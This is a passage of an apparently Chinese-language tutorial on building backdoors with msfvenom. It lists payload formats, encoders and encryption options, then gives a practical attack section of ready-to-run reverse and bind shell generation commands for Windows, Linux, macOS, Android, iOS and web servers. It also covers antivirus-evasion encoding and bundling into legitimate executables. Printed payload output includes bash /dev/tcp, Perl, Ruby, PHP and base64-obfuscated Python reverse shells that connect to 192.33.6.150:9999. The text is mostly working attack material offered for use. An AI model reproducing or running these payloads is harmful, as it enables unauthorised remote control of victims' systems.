<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Name
    ----
    aix
    android
    apple_ios
    brocade
    bsd
    bsdi
    cisco
    firefox
    freebsd
    hardware
    hpux
    irix
    java
    javascript
    juniper
    linux
    mainframe
    multi
    netbsd
    netware
    nodejs
    openbsd
    osx
    php
    python
    r
    ruby
    solaris
    unifi
    unix
    unknown
    windows

 → Qftm :~/Desktop<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="后门格式"><a href="#后门格式" class="headerlink" title="后门格式"></a>后门格式</h3><pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfvenom -l formats</span>

Framework Executable Formats <span class="token punctuation">[</span>--format <span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token punctuation">]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats <span class="token punctuation">[</span>--format <span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token punctuation">]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Name
    ----
    base32
    base64
    <span class="token function">bash</span>
    c
    csharp
    dw
    dword
    hex
    java
    js_be
    js_le
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    sh
    vbapplication
    vbscript

 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="后门编码"><a href="#后门编码" class="headerlink" title="后门编码"></a>后门编码</h3><ul>
<li>编码种类</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfvenom -l encoders</span>

Framework Encoders <span class="token punctuation">[</span>--encoder <span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token punctuation">]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne <span class="token variable">${IFS}</span> Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf<span class="token punctuation">(</span>1<span class="token punctuation">)</span> via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The <span class="token string">"none"</span> Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat<span class="token punctuation">(</span>2<span class="token punctuation">)</span>-based Context Keyed Payload Encoder
    x86/context_time              manual     time<span class="token punctuation">(</span>2<span class="token punctuation">)</span>-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder <span class="token punctuation">(</span>optimised<span class="token punctuation">)</span>
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder

 → Qftm :~/Desktop<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>编码使用</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 对payload载荷使用encoder编码器编码number次并去除坏字符</span>

$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> <span class="token operator">&lt;</span>payload options<span class="token operator">></span> -e <span class="token operator">&lt;</span>encoder<span class="token operator">></span> -i <span class="token operator">&lt;</span>number<span class="token operator">></span> -b <span class="token string">"\x00"</span> -f <span class="token operator">&lt;</span>formmat<span class="token operator">></span> -o shell.format<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="后门加密"><a href="#后门加密" class="headerlink" title="后门加密"></a>后门加密</h3><pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfvenom -l encrypt</span>

Framework Encryption Formats <span class="token punctuation">[</span>--encrypt <span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token punctuation">]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Name
    ----
    aes256
    base64
    rc4
    xor

 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="实战攻略-1"><a href="#实战攻略-1" class="headerlink" title="实战攻略"></a>实战攻略</h2><h3 id="后门生成"><a href="#后门生成" class="headerlink" title="后门生成"></a>后门生成</h3><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> <span class="token operator">&lt;</span>payload options<span class="token operator">></span> -f <span class="token operator">&lt;</span>format<span class="token operator">></span> -o <span class="token operator">&lt;</span>path<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="后门编码-1"><a href="#后门编码-1" class="headerlink" title="后门编码"></a>后门编码</h3><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> <span class="token operator">&lt;</span>payload options<span class="token operator">></span> -e <span class="token operator">&lt;</span>encoder<span class="token operator">></span> -i <span class="token operator">&lt;</span>encoder times<span class="token operator">></span> -n <span class="token operator">&lt;</span>nopsled<span class="token operator">></span> -f <span class="token operator">&lt;</span>format<span class="token operator">></span> -o <span class="token operator">&lt;</span>path<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="后门捆绑"><a href="#后门捆绑" class="headerlink" title="后门捆绑"></a>后门捆绑</h3><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> <span class="token operator">&lt;</span>payload options<span class="token operator">></span> -x <span class="token operator">&lt;</span>template path<span class="token operator">></span> -k -f <span class="token operator">&lt;</span>format<span class="token operator">></span> -o <span class="token operator">&lt;</span>path<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="后门加密-1"><a href="#后门加密-1" class="headerlink" title="后门加密"></a>后门加密</h3><pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> <span class="token operator">&lt;</span>payload options<span class="token operator">></span> --encrypt <span class="token operator">&lt;</span>value<span class="token operator">></span> --encrypt-key <span class="token operator">&lt;</span>value<span class="token operator">></span> --encrypt-iv <span class="token operator">&lt;</span>value<span class="token operator">></span> -f <span class="token operator">&lt;</span>format<span class="token operator">></span> -o <span class="token operator">&lt;</span>path<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="System-Payloads"><a href="#System-Payloads" class="headerlink" title="System Payloads"></a>System Payloads</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f elf -o shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho -o shell
msfvenom -p osx/x64/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho -o shell
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho -o shell
msfvenom -p osx/armle/shell/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho -o shell
msfvenom -p osx/ppc/shell/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho -o shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul>
<li>Messagebox Test</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/messagebox TEXT<span class="token operator">=</span><span class="token string">"hello, it is a test. By Qftm"</span> -f exe -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>正向：可执行后门（被动连接）</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -a x86 --platform windows -p windows/shell/bind_tcp RHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe -o shell.exe
or
msfvenom -p windows/shell/bind_tcp RHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe -o shell.exe
msfvenom -p windows/meterpreter/bind_tcp RHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>反向：可执行后门（32位/64位）（主动连接）</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.apk
or
msfvenom -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.apk

msfvenom -p android/shell/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.apk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p apple_ios/aarch64/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho -o shell
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho -o shell
msfvenom -p apple_ios/armle/meterpreter_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho -o shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><ul>
<li>NC正向连接（被动连接）</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p linux/x86/shell/bind_tcp rhost<span class="token operator">=</span>xxx lport<span class="token operator">=</span>xxx -f elf -o shell.elf
msfvenom -p windows/shell/bind_hidden_tcp rhost<span class="token operator">=</span>xxx lport<span class="token operator">=</span>xxx -f exe -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>NC反向连接（主动连接）</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p linux/x86/shell/reverse_tcp lhost<span class="token operator">=</span>xxx lport<span class="token operator">=</span>xxx -f elf -o shell.elf
msfvenom -p windows/shell/reverse_tcp lhost<span class="token operator">=</span>xxx lport<span class="token operator">=</span>xxx -f exe -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h3><h4 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f asp -o shell.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f aspx -o shell.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="war"><a href="#war" class="headerlink" title="war"></a>war</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f war -o shell.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="jar"><a href="#jar" class="headerlink" title="jar"></a>jar</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p java/shell/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f jar -o shell.jar
msfvenom -p java/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f jar -o shell.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h4><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p nodejs/shell_bind_tcp RHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.js
msfvenom -p nodejs/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.js
msfvenom -p nodejs/shell_reverse_tcp_ssl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># php模块后门</span>
msfvenom -p php/reverse_php LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.php
msfvenom -p php/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.php

<span class="token comment" spellcheck="true"># unix cmd php后门</span>
msfvenom -p cmd/unix/reverse_php_ssl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shells.php

<span class="token comment" spellcheck="true"># cat shells.php</span>
php -r <span class="token string">'<span class="token variable">$ctxt</span>=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);while(<span class="token variable">$s</span>=@stream_socket_client("ssl://192.33.6.150:9999",<span class="token variable">$erno</span>,<span class="token variable">$erstr</span>,30,STREAM_CLIENT_CONNECT,<span class="token variable">$ctxt</span>)){while(<span class="token variable">$l</span>=fgets(<span class="token variable">$s</span>)){exec(<span class="token variable">$l</span>,<span class="token variable">$o</span>);<span class="token variable">$o</span>=implode("\n",<span class="token variable">$o</span>);<span class="token variable">$o</span>.="\n";fputs(<span class="token variable">$s</span>,<span class="token variable">$o</span>);}}'</span><span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># python模块后门</span>
msfvenom -p python/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.py
msfvenom -p python/shell_reverse_tcp_ssl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.py
msfvenom -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.py

<span class="token comment" spellcheck="true"># unix cmd python后门</span>
msfvenom -p cmd/unix/reverse_python LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.py
msfvenom -p cmd/unix/reverse_python_ssl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shells.py

<span class="token comment" spellcheck="true"># cat shell.py</span>
python -c <span class="token string">"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICwgICBzdWJwcm9jZXNzICAgICAgLCAgIG9zICAgICA7ICAgICAgICBob3N0PSIxOTIuMzMuNi4xNTAiICAgICA7ICAgICAgICBwb3J0PTk5OTkgICAgIDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICwgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICA7ICAgICAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAsICAgcG9ydCkpICAgICA7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAsICAgMCkgICAgIDsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICwgICAxKSAgICAgOyAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgLCAgIDIpICAgICA7ICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=')[0]))"</span>

<span class="token comment" spellcheck="true"># cat shells.py</span>
python -c <span class="token string">"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHNzbApzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzE5Mi4zMy42LjE1MCcsOTk5OSkpCnM9c3NsLndyYXBfc29ja2V0KHNvKQp6Rj1GYWxzZQp3aGlsZSBub3QgekY6CglkYXRhPXMucmVjdigxMDI0KQoJaWYgbGVuKGRhdGEpPT0wOgoJCXpGID0gVHJ1ZQoJcHJvYz1zdWJwcm9jZXNzLlBvcGVuKGRhdGEsc2hlbGw9VHJ1ZSxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsc3RkaW49c3VicHJvY2Vzcy5QSVBFKQoJc3Rkb3V0X3ZhbHVlPXByb2Muc3Rkb3V0LnJlYWQoKSArIHByb2Muc3RkZXJyLnJlYWQoKQoJcy5zZW5kKHN0ZG91dF92YWx1ZSkK')[0]))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># unix cmd bash后门</span>
msfvenom -p cmd/unix/reverse_bash LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.sh 

<span class="token comment" spellcheck="true"># cat shell.sh</span>
0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>33-<span class="token punctuation">;</span><span class="token function">exec</span> 33<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.33.6.150/9999<span class="token punctuation">;</span>sh <span class="token operator">&lt;</span><span class="token operator">&amp;</span>33 <span class="token operator">></span><span class="token operator">&amp;</span>33 2<span class="token operator">></span><span class="token operator">&amp;</span>33<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># unix cmd perl后门</span>
msfvenom -p cmd/unix/reverse_perl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.pl
msfvenom -p cmd/unix/reverse_perl_ssl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shells.pl

<span class="token comment" spellcheck="true"># cat shell.pl</span>
perl -MIO -e <span class="token string">'<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);foreach my <span class="token variable">$key</span>(keys %ENV){if(<span class="token variable">$ENV</span>{<span class="token variable">$key</span>}=~/(.*)/){<span class="token variable">$ENV</span>{<span class="token variable">$key</span>}=<span class="token variable">$1</span>;}}<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"192.33.6.150:9999");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);while(&lt;>){if(<span class="token variable">$_</span>=~ /(.*)/){system <span class="token variable">$1</span>;}};'</span>

<span class="token comment" spellcheck="true"># cat shells.pl</span>
perl -e <span class="token string">'use IO::Socket::SSL;<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);<span class="token variable">$c</span>=IO::Socket::SSL->new(PeerAddr=>"192.33.6.150:9999",SSL_verify_mode=>0);while(sysread(<span class="token variable">$c</span>,<span class="token variable">$i</span>,8192)){syswrite(<span class="token variable">$c</span>,<span class="token variable"><span class="token variable">`</span>$i<span class="token variable">`</span></span>);}'</span>

<span class="token comment" spellcheck="true"># windows cmd perl后门</span>
msfvenom -p cmd/windows/reverse_perl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.pl

<span class="token comment" spellcheck="true"># cat shell.pl</span>
perl -MIO -e <span class="token string">"<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,\"192.33.6.150:9999\");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># unix cmd ruby后门</span>
msfvenom -p cmd/unix/reverse_ruby LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.rb
msfvenom -p cmd/unix/reverse_ruby_ssl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shells.rb

<span class="token comment" spellcheck="true"># cat shell.rb</span>
ruby -rsocket -e <span class="token string">'exit if fork;c=TCPSocket.new("192.33.6.150","9999");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>

<span class="token comment" spellcheck="true"># cat shells.rb</span>
ruby -rsocket -ropenssl -e <span class="token string">'exit if fork;c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("192.33.6.150","9999")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end'</span>

<span class="token comment" spellcheck="true"># windows cmd ruby后门</span>
msfvenom -p cmd/windows/reverse_ruby LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw -o shell.rb

